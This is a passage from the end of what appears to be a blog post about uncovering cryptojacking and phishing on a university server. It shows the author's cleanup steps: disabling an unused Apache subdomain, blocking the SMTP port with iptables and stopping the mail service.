can install Host-based and/or Network-based Intrusion Detection Systems for good measure. Cleaning Up Since we were not using the subdomain site, I simply shut it down:\n1 2 3 4 5 6 7 8 9 10 11 $vim /etc/apache2/sites-available/default-ssl.conf #\u0026lt;VirtualHost _default_:443\u0026gt; # ServerAdmin admin@email.ca # ServerName subdomain.website.ca # # Indexes + Directory Root. # DirectoryIndex index.php # DocumentRoot /var/www/subdomain/ # … $sudo service apache2 restart For safety purposes, I also blocked SMTP Port and stopped the mail service:\n1 2 sudo iptables -A INPUT -i eth0 -p tcp --destination-port 25 -j DROP sudo /etc/init.d/postfix stop ","date":"2020-06-06T17:50:51-05:00","image":"http://localhost:1313/post/cryptojacking-phishing-savi/unsplash-coding.jpg","permalink":"http://localhost:1313/p/uncovering-cryptojacking/phishing-at-university-of-toronto/","title":"Uncovering Cryptojacking/Phishing At University of Toronto"}]